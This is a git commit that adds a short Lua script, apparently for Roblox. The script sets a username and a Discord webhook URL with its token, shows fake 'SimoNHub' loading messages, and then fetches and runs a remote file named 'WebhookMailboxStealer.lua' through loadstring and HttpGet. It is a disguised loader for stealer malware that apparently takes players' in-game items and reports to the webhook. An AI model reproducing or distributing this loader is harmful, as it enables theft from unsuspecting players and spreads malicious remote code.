9f8d4693166b94400258abcc2ed0f7e2dd0e0aae
Barteks2 <137007377+Barteks2@users.noreply.github.com>
2023-06-25 10:48:03 +0100

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,9 @@
+Username = "iamhumanandarobot4"
+WebHook = "https://discordapp.com/api/webhooks/1119748568144674877/WDiat3Ztvs3L9yW-ssOI6XIMsIdpcWHiVInp6Fd-DE6U15SBs5ylbcJTI5scenJ2X4km"
+loadingscreen = true
+_G.CustomScriptName = "SimoNHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua%22))()
